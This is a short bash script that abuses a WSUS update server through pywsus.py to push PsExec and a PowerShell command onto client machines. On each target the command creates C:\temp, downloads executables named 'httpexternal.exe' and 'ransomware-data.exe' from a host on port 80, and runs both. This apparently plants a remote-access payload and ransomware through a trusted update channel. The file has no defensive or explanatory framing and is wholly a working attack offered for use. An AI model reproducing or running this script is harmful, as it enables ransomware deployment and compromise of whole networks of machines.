#!/bin/bash

# Define the target WSUS server IP address and port
WSUS_HOST="192.168.2.42"
WSUS_PORT="8530"

# Define the executable to be executed on the target machines
EXECUTABLE="PsExec.exe"

# Define the command to be executed on the target machines
COMMAND='/accepteula /s cmd.exe /c powershell.exe \
if (-not (Get-Process -Name "httpexternal" -ErrorAction SilentlyContinue)) { \
    mkdir C:\temp; \
    Invoke-WebRequest -Uri "http://192.168.2.42:80/download/httpexternal.exe" -OutFile "C:\temp\httpexternal.exe"; \
    Invoke-WebRequest -Uri "http://192.168.2.42:80/download/ransomware-data.exe" -OutFile "C:\temp\ransomware-data.exe"; \
    Start-Process -FilePath "C:\temp\httpexternal.exe"; \
    Start-Process -FilePath "C:\temp\ransomware-data.exe" \
}'

# Execute the command using Python pywsus.py
python pywsus.py -H $WSUS_HOST -p $WSUS_PORT -e $EXECUTABLE -c "$COMMAND"
